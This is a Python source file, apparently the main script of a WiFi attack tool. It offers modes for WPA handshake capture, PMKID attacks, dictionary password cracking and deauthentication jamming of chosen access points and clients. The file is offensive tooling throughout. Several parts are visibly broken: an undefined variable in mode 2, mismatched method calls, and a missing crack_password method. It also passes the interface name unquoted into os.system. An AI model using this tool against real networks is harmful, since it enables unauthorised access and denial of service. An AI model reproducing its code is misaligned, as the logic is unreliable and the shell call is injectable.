import optparse
import os
import random
import re
import subprocess
import sys
import threading
import time
from signal import SIGINT, getsignal, signal

from scapy.utils import rdpcap

from screen import Display
from utils import Modes, tabulate
from wireless import (
    CAPTURE_HAND,
    CAPTURE_PMKID,
    DEAUTH,
    PMKID,
    Shifter,
    Sniper,
    eAPoL,
)

WRITE_FILE = ""
DICTIONARY_PATH = ""
VERBOSE_MODE = False
KEY = None
SIGNAL_HANDLER = getsignal(SIGINT)
HANDSHAKE_FILE = ""


class Interface:
    """Manages operations related to the wireless interface."""

    def __init__(self, interface_name: str):
        self.interface_name = interface_name
        self.interfaces = (
            self.list_interfaces()
        )
        self.channel = 1
        self.is_hopper_running = False
        self.check_help_message = ""

    @property
    def is_managed_mode(self) -> bool:
        """Checks if the interface is in Managed Mode."""
        return self.check_interface_mode(
            "Managed"
        )

    @property
    def is_monitor_mode(self) -> bool:
        """Checks if the interface is in Monitor Mode."""
        return self.check_interface_mode(
            "Monitor"
        )

    def list_interfaces(self) -> list:
        """Lists all available network interfaces."""
        ifaces = []
        with open(
            "/proc/net/dev", "r"
        ) as dev:
            data = dev.read()
            ifaces = [
                iface.strip(":")
                for iface in re.findall(
                    r"[a-zA-Z0-9]+:", data
                )
            ]
        return ifaces

    def check_interface_mode(
        self, mode: str
    ) -> bool:
        """Checks if the specified interface is in the desired mode."""
        if (
            self.interface_name
            not in self.interfaces
        ):
            self.check_help_message = f"There's no such interface: {self.interface_name}"
            return False

        output = subprocess.check_output(
            ["iwconfig", self.interface_name]
        ).decode("utf-8")
        current_mode = re.search(
            r"Mode:\s*([A-Za-z]+)", output
        )

        if (
            current_mode
            and mode in current_mode.group(1)
        ):
            return True

        self.check_help_message = f"Wireless interface isn't in {mode} Mode"
        return False

    def set_channel(
        self, channel: int
    ) -> None:
        """Sets the wireless interface to the specified channel."""
        os.system(
            f"iwconfig {self.interface_name} channel {channel}"
        )
        self.channel = channel

    def start_hopper(self) -> None:
        """Starts hopping through channels in a separate thread."""
        self.is_hopper_running = True
        threading.Thread(
            target=self.hop_channels,
            daemon=True,
        ).start()

    def hop_channels(self) -> None:
        """Cycles through available wireless channels every 0.40 seconds."""
        while self.is_hopper_running:
            self.set_channel(self.channel)
            self.channel = random.choice(
                [
                    ch
                    for ch in range(1, 15)
                    if ch != self.channel
                ]
            )
            time.sleep(0.40)

    def stop_hopper(self) -> None:
        """Stops the channel hopping."""
        self.is_hopper_running = False


class Sniffer:
    """Captures WiFi access points and their information."""

    def __init__(
        self,
        interface: Interface,
        bssid: str = None,
        essid: str = None,
    ):
        self.interface = interface
        self.bssid = bssid
        self.essid = essid
        self.shifter = Shifter(
            self.interface.interface_name,
            self.bssid,
            self.essid,
            VERBOSE_MODE,
        )
        signal(
            SIGINT, self.terminate_shifter
        )
        self.start_sniffing()

    def start_sniffing(self) -> None:
        """Initialises capturing process."""
        print(
            "Scanning! Press [CTRL+C] to stop."
        )
        time.sleep(1)
        self.screen = Display(VERBOSE_MODE)
        threading.Thread(
            target=self.screen.Shifter,
            args=(
                self.shifter,
                self.interface,
            ),
            daemon=True,
        ).start()
        self.shifter.run()

    def terminate_shifter(
        self, sig, frame
    ) -> None:
        """Handles termination of the shifter on CTRL+C."""
        self.screen.shifter_break = True
        while (
            not self.screen.Shifter_stopped
        ):
            time.sleep(0.1)
        self.cleanup()

    def cleanup(self) -> None:
        """Cleans up and exits gracefully."""
        self.screen.clear()
        del self.screen
        signal(SIGINT, SIGNAL_HANDLER)
        self.display_capture_results()

    def display_capture_results(
        self,
    ) -> None:
        """Displays captured access point information."""
        tabulator = []
        headers = [
            "No",
            "ESSID",
            "PWR",
            "ENC",
            "AUTH",
            "CH",
            "BSSID",
            "VENDOR",
        ]
        if VERBOSE_MODE:
            headers.append("CL")
        signal_list = sorted(
            [
                ap["pwr"]
                for ap in self.shifter.results()
            ],
            reverse=True,
        )

        count = 1
        for signal_strength in signal_list:
            for ap in self.shifter.results():
                if (
                    ap["pwr"]
                    == signal_strength
                ):
                    ap["count"] = count
                    count += 1
                    tabulator.append(
                        self.format_ap_data(
                            ap
                        )
                    )
                    self.shifter.results().remove(
                        ap
                    )
        print(
            "\n"
            + tabulate(
                tabulator, headers=headers
            )
            + "\n"
        )

    def format_ap_data(
        self, ap: dict
    ) -> list:
        """Formats access point data for display."""
        if VERBOSE_MODE:
            return [
                ap["count"],
                f"{ap['essid']}",
                ap["pwr"],
                ap["auth"],
                ap["cipher"],
                ap["channel"],
                ap["bssid"].upper(),
                ap["vendor"],
            ]
        return [
            ap["count"],
            f"{ap['essid']}",
            ap["pwr"],
            ap["auth"],
            ap["cipher"],
            ap["channel"],
            ap["bssid"].upper(),
        ]


class PMKIDGenerator:
    """Generates PMKID for authentication against an AP."""

    def __init__(
        self,
        iface: Interface,
        ap_info: dict,
        num_frames: int,
    ):
        self.ap_info = ap_info
        self.iface = iface
        self.pmkid = PMKID(
            self.ap_info["bssid"],
            self.ap_info["essid"],
            self.iface.interface_name,
            self.ap_info["beacon"],
            DICTIONARY_PATH,
            KEY,
            verbose=VERBOSE_MODE,
            num_frames=num_frames,
        )

    def authenticate(self) -> bool:
        """Authenticates against the AP."""
        return self.pmkid.dev_conn()

    def associate(self) -> bool:
        """Performs an association with the AP."""
        success = False
        while not success:
            success = self.pmkid.asso_conn()
            if not success:
                print(
                    "Attempting to authenticate with Access Point."
                )
                self.authenticate()
        return success

    def crack_password(self) -> None:
        """Cracks the password from captured data."""
        password, hash_, hash2 = (
            self.pmkid.crack(WRITE_FILE)
        )
        if password is None:
            print(
                "Password Not Found in Dictionary. Try enlarging it!"
            )
            sys.exit()
        else:
            print(
                f"Password Found: {password}"
            )
            if VERBOSE_MODE:
                print(
                    f"PMKID: {hash2}\nPMK: {hash_}"
                )


class Phazer:
    """Handles targeting and cracking of selected access points."""

    def __init__(self, sniffer: Sniffer):
        self.interface = sniffer.interface
        self.wifi_aps = (
            sniffer.shifter.results()
        )

    def get_target_ap(self) -> dict:
        """Gets target AP based on user input."""
        while True:
            try:
                count = input(
                    "Enter Your Target Number [q]uit/[n]: "
                )
                if count.lower() == "q":
                    sys.exit(0)
                for ap in self.wifi_aps:
                    if (
                        str(ap["count"])
                        == count
                    ):
                        return ap
            except ValueError:
                continue

    def sniff_clients(
        self,
        bssid: str,
        essid: str,
        channel: int,
        timeout: int,
    ) -> list:
        """Sniffs clients connected to a specific AP."""
        sniper = Sniper(
            self.interface.interface_name,
            bssid,
            essid,
            channel,
            timeout,
            VERBOSE_MODE,
        )
        print(
            "Scanning for Access Point Stations. Press [CTRL+C] to Stop."
        )
        signal(SIGINT, SIGNAL_HANDLER)
        sniper.cl_generator()
        signal(SIGINT, grace_exit)
        return sniper.clients()


class Moderator:
    """Handles the modes of operation for cracking passwords."""

    def __init__(
        self,
        mode: int,
        sniffer: Sniffer = None,
        iface: Interface = None,
    ):
        self.mode = mode
        self.interface = iface
        self.sniffer = sniffer

    def handle_handshake_mode(
        self, target_ap: dict, phazer: Phazer
    ) -> None:
        """Handles the handshake mode of operation."""
        print(
            f"Verifying... Looking for {target_ap['bssid']} for EAPOLs"
        )
        eap = eAPoL(target_ap["bssid"])
        packets = rdpcap(HANDSHAKE_FILE)
        valid_handshake = any(
            eap.check(pkt) for pkt in packets
        )

        if valid_handshake:
            phazer.wifi_aps = eap.get_pols()
            phazer.crack_password()
        else:
            print(
                "Handshake not found. Please provide a valid handshake!"
            )

    def handle_wpa_mode(
        self,
        phazer: Phazer,
        target_ap: dict,
        timeout: int,
        deauth_count: int,
    ) -> None:
        """Handles the WPA mode of operation."""
        if "WPA" in target_ap["auth"]:
            self.interface.stop_hopper()
            time.sleep(1)
            self.interface.set_channel(
                target_ap["channel"]
            )
            clients = phazer.sniff_clients(
                target_ap["bssid"],
                target_ap["essid"],
                target_ap["channel"],
                timeout,
            )

            if clients:
                phazer.sniff_clients(
                    target_ap,
                    clients,
                    timeout,
                    deauth_count,
                )
                phazer.crack_password()
            else:
                print(
                    "Found Clients [0]. Shutting Down!"
                )
                sys.exit(1)
        else:
            print(
                "The specified mode can only be used for WPA/WPA2 Networks"
            )
            sys.exit(-1)

    def crack_mode(
        self,
        mode_type: int,
        capture_file: str,
        essid: str,
    ) -> None:
        """Manages the cracking mode."""
        if mode_type == 1:
            capture = CAPTURE_HAND(
                capture_file,
                DICTIONARY_PATH,
                essid,
                VERBOSE_MODE,
            )
            if capture.verify():
                capture.organise()
                capture.loop()
            else:
                print(
                    "Invalid Capture! Are you sure this is a valid capture?"
                )
                sys.exit(-1)

        elif mode_type == 2:
            capture = CAPTURE_PMKID(
                capture_file,
                DICTIONARY_PATH,
                VERBOSE_MODE,
            )
            if capture.verify():
                capture.organise()
                capture.loop()
            else:
                print(
                    "Invalid Capture! Are you sure this is a valid capture?"
                )
                sys.exit(-1)

    def silent_deauth_mode(
        self,
        deauth: int,
        ap: str,
        client: str,
        count: int,
    ) -> None:
        """Handles silent deauthentication."""
        silent = DEAUTH(
            self.interface.interface_name,
            deauth,
            ap,
            client,
            count,
            VERBOSE_MODE,
        )
        silent.locate()

        if silent.verify():
            silent.jam()
        else:
            print(
                f"Unable to find network {ap.replace(':', '').upper()}."
            )
            sys.exit(-1)


def grace_exit(sig, frame) -> None:
    """Gracefully exits the program on signal."""
    print("Closing. Cleaning up the mess!")
    time.sleep(0.50)
    sys.exit(0)


def parse_options() -> optparse.Values:
    """Parses command line options."""
    parser = optparse.OptionParser(
        add_help_option=False
    )
    parser.add_option(
        "-h",
        "--help",
        dest="help",
        action="store_true",
        help="Show this help manual",
    )
    parser.add_option(
        "-m",
        "--mode",
        dest="mode",
        type="int",
        help="Mode to Use.",
    )
    parser.add_option(
        "-i",
        "--interface",
        dest="interface",
        type="string",
        help="Monitor Wireless Interface to use",
    )
    parser.add_option(
        "-e",
        "--essid",
        dest="essid",
        type="string",
        help="Targets AP's with the specified ESSIDs",
    )
    parser.add_option(
        "-b",
        "--bssid",
        dest="bssid",
        type="string",
        help="Targets AP's with the specified BSSIDs",
    )
    parser.add_option(
        "-c",
        "--channel",
        dest="channel",
        type="int",
        help="Listen on specified channel.",
    )
    parser.add_option(
        "-d",
        "--dictionary",
        dest="dictionary",
        type="string",
        help="Dictionary containing Passwords",
    )
    parser.add_option(
        "-w",
        "--write",
        dest="write",
        type="string",
        help="Write Data to a file.",
    )
    parser.add_option(
        "-t",
        "--timeout",
        dest="timeout",
        default=15,
        type="int",
        help="Specify timeout for locating target clients.",
    )
    parser.add_option(
        "-v",
        "--verbose",
        dest="verbose",
        action="store_true",
        help="Print hashes and verbose messages.",
    )
    parser.add_option(
        "",
        "--handshake",
        dest="handshake",
        type="string",
        help="Handshake to use, instead of dissociating",
    )
    parser.add_option(
        "",
        "--deauth",
        dest="deauth",
        type="int",
        default=32,
        help="Deauth Packets to send.",
    )
    parser.add_option(
        "",
        "--frames",
        dest="frames",
        type="int",
        default=0,
        help="Number of Auth and Association Frames",
    )
    parser.add_option(
        "",
        "--type",
        dest="type",
        type="string",
        help="Type of Cracking",
    )
    parser.add_option(
        "",
        "--list-types",
        dest="list_types",
        action="store_true",
        help="List of Available types",
    )
    parser.add_option(
        "-r",
        "--read",
        dest="read",
        type="string",
        help="Read capture in mode 3",
    )
    parser.add_option(
        "",
        "--ap",
        dest="ap",
        type="string",
        help="Access Point BSSID",
    )
    parser.add_option(
        "",
        "--client",
        dest="client",
        type="string",
        help="STA (Client) BSSID",
    )
    parser.add_option(
        "-0",
        "--count",
        dest="deauth_count",
        type="int",
        help="Number of Deauth Frames to Send",
    )

    options, _ = parser.parse_args()
    return options


def main():
    """Main execution function for the program."""
    global \
        WRITE_FILE, \
        DICTIONARY_PATH, \
        VERBOSE_MODE, \
        KEY, \
        HANDSHAKE_FILE

    options = parse_options()

    if options.help and not options.mode:
        print("Help data...")
        sys.exit(0)

    VERBOSE_MODE = bool(options.verbose)

    if not Modes().get_mode(options.mode):
        print(
            "No Mode Specified! Use -h, --help option to see available modes."
        )
        sys.exit(-1)

    if options.mode == 1:
        WRITE_FILE = options.write
        HANDSHAKE_FILE = options.handshake
        DICTIONARY_PATH = options.dictionary
        iface = Interface(options.interface)

        if not iface.is_monitor_mode:
            print(iface.check_help_message)
            sys.exit(-1)

        if options.channel is None:
            print(
                "Channel Specified: NONE. Hopper Status: Running"
            )
            iface.start_hopper()
        else:
            iface.set_channel(
                options.channel
            )
            print(
                f"Channel Specified: {options.channel}. Hopper Stopped"
            )

        sniffer = Sniffer(
            iface,
            options.bssid,
            options.essid,
        )
        phazer = Phazer(sniffer)
        target_ap = phazer.get_target_ap()
        signal(SIGINT, grace_exit)

        moderator = Moderator(
            options.mode, sniffer, iface
        )
        moderator.handle_wpa_mode(
            phazer,
            target_ap,
            options.timeout,
            options.deauth,
        )

    elif options.mode == 2:
        WRITE_FILE = options.write
        DICTIONARY_PATH = options.dictionary
        iface = Interface(options.interface)

        if not iface.is_monitor_mode:
            print(iface.check_help_message)
            sys.exit(-1)

        sniffer = Sniffer(
            iface,
            options.bssid,
            options.essid,
        )
        pmk_generator = PMKIDGenerator(
            iface,
            phazer.get_target_ap(),
            options.frames,
        )
        signal(SIGINT, grace_exit)

        if pmk_generator.authenticate():
            if pmk_generator.associate():
                pmk_generator.crack_password()
        else:
            print(
                "This attack only works for WPA2 networks"
            )
            sys.exit(0)

    elif options.mode == 3:
        if options.list_types:
            print(
                "Available capture types..."
            )
            sys.exit(0)

        mode_type = {
            "handshake": 1,
            "pmkid": 2,
        }.get(options.type)

        DICTIONARY_PATH = options.dictionary
        capture_file = options.read

        if not os.path.isfile(capture_file):
            print(
                f"No Such File: {capture_file}"
            )
            sys.exit(-1)

        moderator = Moderator(options.mode)
        moderator.crack_mode(
            mode_type,
            capture_file,
            options.essid,
        )

    elif options.mode == 4:
        iface = Interface(options.interface)
        if not iface.is_monitor_mode:
            print(iface.check_help_message)
            sys.exit(-1)

        signal(SIGINT, grace_exit)
        target_ap, client = (
            options.ap,
            options.client,
        )
        moderator = Moderator(options.mode)
        moderator.silent_deauth_mode(
            options.deauth,
            target_ap,
            client,
            options.deauth_count,
        )


if __name__ == "__main__":
    if not sys.platform.startswith("linux"):
        print(
            "Not Supportable Operating System!"
        )
        sys.exit(1)

    main()
